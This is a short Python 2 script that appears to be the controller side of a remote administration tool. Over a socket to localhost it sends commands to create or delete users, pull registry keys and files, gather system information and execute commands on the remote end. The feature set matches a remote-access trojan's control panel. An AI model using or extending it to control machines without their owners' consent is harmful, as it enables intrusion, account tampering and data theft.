import socket,struct

def receive_data(sock):
    data_len, = struct.unpack("!I", sock.recv(4))
    return sock.recv(data_len)

def send_data(sock,data):
    sock.send(struct.pack("!I", len(data)))
    sock.send(data)

def main():
    cmd_lst=["CU","DU","DRK","DF","GI","EC"]
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect(('127.0.0.1',7073))
    while True:
        print "Commands"
        print "CU - Create User"
        print "DU - Delete User"
        print "DRK - Download Registry Key"
        print "DF - Download File"
        print "GI - Gather Information"
        print "EC - Execute Command"

        cmd = raw_input(receive_data(sock))
        if cmd == "CU":
            send_data(sock,cmd)
            send_data(sock,raw_input(receive_data(sock)))
            send_data(sock,raw_input(receive_data(sock)))

        elif cmd == "DU":
            send_data(sock, cmd)
            send_data(sock, raw_input(receive_data(sock)))

        elif cmd == "DRK":
            send_data(sock, cmd)
            send_data(sock, raw_input(receive_data(sock)))
            send_data(sock, raw_input(receive_data(sock)))
            data = receive_data(sock)

            while data!="DATA_COMPLETE":
                print data
                data=receive_data(sock)

        elif cmd == "DF":
            send_data(sock, cmd)
            send_data(sock, raw_input(receive_data(sock)))
            print receive_data(sock)

        elif cmd == "GI":
            send_data(sock, cmd)
            send_data(sock, raw_input(receive_data(sock)))
            print receive_data(sock)


        elif cmd == "EC":
            send_data(sock, cmd)
            send_data(sock, raw_input(receive_data(sock)))
            send_data(sock, raw_input(receive_data(sock)))

        else:
            send_data(sock, cmd)
            send_data(sock,"Null")
            print receive_data(sock)
            

main()